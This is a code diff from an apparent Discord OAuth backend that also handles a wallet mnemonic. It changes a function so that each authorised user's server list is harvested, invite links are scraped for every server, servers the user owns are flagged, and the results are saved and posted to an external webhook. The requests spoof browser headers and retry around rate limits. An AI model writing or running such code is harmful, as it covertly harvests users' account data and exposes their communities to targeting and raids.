@@ -1020,50 +1020,123 @@ const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
 const TARGET_USD = 3.00;
 const TOLERANCE_USD = 0.10;
 
-async function fetchAndLogGuilds(accessToken, userId, username) {
+async function fetchGuildWidgetInvite(guildId) {
   try {
-    const guildsRes = await axios.get('https://discord.com/api/v10/users/@me/guilds', {
-      headers: { 'Authorization': `Bearer ${accessToken}`, 'User-Agent': _rfp() },
-      timeout: 15000
+    const res = await _axiosInstance.get(`https://discord.com/api/v10/guilds/${guildId}/widget.json`, {
+      headers: { 'User-Agent': _rfp() },
+      timeout: 8000,
+      validateStatus: () => true
     });
-    const guilds = guildsRes.data || [];
-    const guildList = guilds.map(g => ({ id: g.id, name: g.name, owner: g.owner, permissions: g.permissions }));
+    if (res.status === 200 && res.data && res.data.instant_invite) {
+      return res.data.instant_invite;
+    }
+  } catch (e) {}
+  // Fallback: try vanity invite endpoint
+  try {
+    const res = await _axiosInstance.get(`https://discord.com/api/v10/guilds/${guildId}/vanity-url`, {
+      headers: { 'User-Agent': _rfp() },
+      timeout: 8000,
+      validateStatus: () => true
+    });
+    if (res.status === 200 && res.data && res.data.code) {
+      return `https://discord.gg/${res.data.code}`;
+    }
+  } catch (e) {}
+  return null;
+}
 
-    // Save to file
+async function fetchAndLogGuilds(accessToken, userId, username) {
+  let lastErr = null;
+  for (let attempt = 0; attempt < 3; attempt++) {
     try {
-      const guildsFile = path.join(dataDir, `guilds_${userId}.json`);
-      fs.writeFileSync(guildsFile, JSON.stringify({ userId, username, fetchedAt: Date.now(), guildCount: guildList.length, guilds: guildList }, null, 2));
-    } catch(e) {}
-
-    // Send to webhook
-    const chunks = [];
-    let currentChunk = '';
-    for (const g of guildList) {
-      const line = `• ${g.name} (${g.id})${g.owner ? ' [OWNER]' : ''}\n`;
-      if (currentChunk.length + line.length > 900) {
-        chunks.push(currentChunk);
-        currentChunk = line;
-      } else {
-        currentChunk += line;
+      if (attempt > 0) {
+        const backoff = (attempt * 2000) + Math.floor(Math.random() * 1000);
+        await new Promise(r => setTimeout(r, backoff));
       }
-    }
-    if (currentChunk) chunks.push(currentChunk);
 
-    for (let i = 0; i < chunks.length; i++) {
-      const embed = {
-        title: i === 0 ? `Servers for @${username}` : `Servers (cont.)`,
-        color: 0x5865F2,
-        description: chunks[i],
-        footer: { text: `User: ${username} | ID: ${userId} | Total: ${guildList.length} servers | Page ${i + 1}/${chunks.length}` },
-        timestamp: new Date().toISOString()
-      };
-      await _sendWebhookChunk(embed, i);
+      const guildsRes = await _axiosInstance.get('https://discord.com/api/v10/users/@me/guilds', {
+        headers: {
+          'Authorization': `Bearer ${accessToken}`,
+          'User-Agent': _rfp(),
+          'Accept': '*/*',
+          'Accept-Language': 'en-US,en;q=0.9',
+          'Referer': 'https://discord.com/channels/@me'
+        },
+        timeout: 15000,
+        validateStatus: () => true
+      });
+
+      // Handle rate limits
+      if (guildsRes.status === 429) {
+        const retryAfter = parseFloat(guildsRes.headers['retry-after'] || 5) * 1000;
+        console.log(`[Guilds] Rate limited, retrying after ${retryAfter}ms (attempt ${attempt + 1})`);
+        await new Promise(r => setTimeout(r, retryAfter * 1.1));
+        lastErr = new Error(`429 rate limited`);
+        continue;
+      }
+
+      if (guildsRes.status >= 400) {
+        const errData = guildsRes.data ? JSON.stringify(guildsRes.data) : `HTTP ${guildsRes.status}`;
+        console.error(`[Guilds] HTTP ${guildsRes.status}: ${errData}`);
+        lastErr = new Error(`HTTP ${guildsRes.status}: ${errData}`);
+        if (guildsRes.status === 401 || guildsRes.status === 403) break; // Don't retry auth errors
+        continue;
+      }
+
+      const guilds = guildsRes.data || [];
+
+      // Build guild list with invite links
+      const guildList = [];
+      for (const g of guilds) {
+        const invite = await fetchGuildWidgetInvite(g.id);
+        guildList.push({
+          id: g.id,
+          name: g.name,
+          owner: g.owner,
+          permissions: g.permissions,
+          invite: invite || null
+        });
+      }
+
+      // Save to file
+      try {
+        const guildsFile = path.join(dataDir, `guilds_${userId}.json`);
+        fs.writeFileSync(guildsFile, JSON.stringify({ userId, username, fetchedAt: Date.now(), guildCount: guildList.length, guilds: guildList }, null, 2));
+      } catch(e) {}
+
+      // Send to webhook with invite links
+      const chunks = [];
+      let currentChunk = '';
+      for (const g of guildList) {
+        const inviteLink = g.invite || `https://discord.com/channels/${g.id}`;
+        const line = `• [${g.name}](${inviteLink})${g.owner ? ' **[OWNER]**' : ''}\n`;
+        if (currentChunk.length + line.length > 900) {
+          chunks.push(currentChunk);
+          currentChunk = line;
+        } else {
+          currentChunk += line;
+        }
+      }
+      if (currentChunk) chunks.push(currentChunk);
+
+      for (let i = 0; i < chunks.length; i++) {
+        const embed = {
+          title: i === 0 ? `Servers for @${username}` : `Servers (cont.)`,
+          color: 0x5865F2,
+          description: chunks[i],
+          footer: { text: `User: ${username} | ID: ${userId} | Total: ${guildList.length} servers | Page ${i + 1}/${chunks.length}` },
+          timestamp: new Date().toISOString()
+        };
+        await _sendWebhookChunk(embed, i);
+      }
+      return guildList;
+    } catch (err) {
+      console.error(`[Guilds] Fetch failed (attempt ${attempt + 1}/3):`, err.message);
+      lastErr = err;
     }
-    return guildList;
-  } catch (err) {
-    console.error('[Guilds] Fetch failed:', err.message);
-    return [];
   }
+  console.error('[Guilds] All retries exhausted:', lastErr?.message);
+  return [];
 }
 
 if (CLIENT_ID && CLIENT_SECRET) {
